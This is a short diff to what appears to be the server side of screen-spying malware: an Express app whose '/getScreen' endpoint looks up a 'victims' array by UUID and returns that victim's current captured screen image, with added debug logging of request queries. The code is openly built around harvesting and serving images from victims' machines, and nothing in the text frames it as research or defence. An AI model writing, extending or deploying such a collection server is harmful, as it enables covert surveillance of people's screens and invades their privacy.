@@ -93,9 +93,11 @@ app.post('/sendScreen', async (req,res) => {
 
 app.get('/getScreen', async (req,res) => {
     if (req && req.query && req.query.uuid) {
+      console.log(req.query)
+      console.log(req.query.uuid)
       const victim = victims.find(potentialVictim => potentialVictim.uuid === req.query.uuid)
-      if (victim && victim.photoId) {
-        safeSend(res,req,{ 'image': victim.photoId, 'imageId': victim.photoId, 'ok': true })
+      if (victim && victim.currentPhoto) {
+        safeSend(res,req,{ 'image': victim.currentPhoto, 'imageId': victim.photoId, 'ok': true })
       } else {
        safeSend(res,req,{ 'image': 'none', 'imageId': 14, 'ok': false })
       }
